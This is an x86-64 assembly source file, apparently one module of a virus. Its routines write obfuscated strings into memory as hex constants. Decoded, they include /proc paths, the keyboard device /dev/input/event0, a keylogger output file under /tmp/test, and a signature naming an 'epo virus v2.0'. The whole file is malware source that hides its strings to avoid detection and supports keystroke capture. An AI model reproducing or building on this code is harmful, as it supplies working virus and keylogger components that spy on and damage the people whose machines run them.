global write_proc
global write_exe
global write_inhibitor
global write_stat
global write_begin
global write_filename_src
global write_test
global write_test2
global write_sign
global write_event0
global write_keylog

write_exe:
	mov [rdi], DWORD 0x6578652f
	mov [rdi + 0x4], DWORD 0x00000000
	ret

write_proc:
	mov [rdi], DWORD 0x6f72702f
	mov [rdi + 0x4], DWORD 0x00002f63
	ret

write_inhibitor:
	mov [rdi], DWORD 0x69686e69
	mov [rdi + 0x4], DWORD 0x6f746962
	mov [rdi + 0x8], DWORD 0x00000072
	ret

write_stat:
	mov [rdi], DWORD 0x6174732f
	mov [rdi + 0x4], DWORD 0x00000074
	ret

write_begin:
	mov [rdi], DWORD 0x4e69416d
	mov [rdi + 0x4], DWORD 0x0a717020
	mov [rdi + 0x8], DWORD 0x0
	ret

write_filename_src:
	mov [rdi], DWORD 0x74736574
	mov [rdi + 0x4], DWORD 0x7365742F
	mov [rdi + 0x8], DWORD 0x00000074
	ret

write_test:
	mov [rdi], DWORD 0x706d742f
	mov [rdi + 0x4], DWORD 0x7365742f
	mov [rdi + 0x8], DWORD 0x00002f74
	ret

write_test2:
	mov [rdi], DWORD 0x706d742f
	mov [rdi + 0x4], DWORD 0x7365742f
	mov [rdi + 0x8], DWORD 0x002f3274
	ret

write_sign:
	mov [rdi], DWORD 0x6f72613c
	mov [rdi + 0x4], DWORD 0x6e6f6962
	mov [rdi + 0x8], DWORD 0x70202620
	mov [rdi + 0xc], DWORD 0x6472616e
	mov [rdi + 0x10], DWORD 0x27697a6f
	mov [rdi + 0x14], DWORD 0x70652073
	mov [rdi + 0x18], DWORD 0x6976206f
	mov [rdi + 0x1c], DWORD 0x20737572
	mov [rdi + 0x20], DWORD 0x302e3276
	mov [rdi + 0x24], DWORD 0x0000003e
	ret

write_event0:
	mov [rdi], DWORD 0x7665642f
	mov [rdi + 0x4], DWORD 0x706e692f
	mov [rdi + 0x8], DWORD 0x652f7475
	mov [rdi + 0xc], DWORD 0x746e6576
	mov [rdi + 0x10], DWORD 0x00000030
	ret
	
write_keylog: 
	mov [rdi], DWORD 0x706d742f
	mov [rdi + 0x4], DWORD 0x7365742f
	mov [rdi + 0x8], DWORD 0x656b2f74
	mov [rdi + 0xc], DWORD 0x676f6c79
	mov [rdi + 0x10], DWORD 0x2e726567
	mov [rdi + 0x14], DWORD 0x00747874
	ret
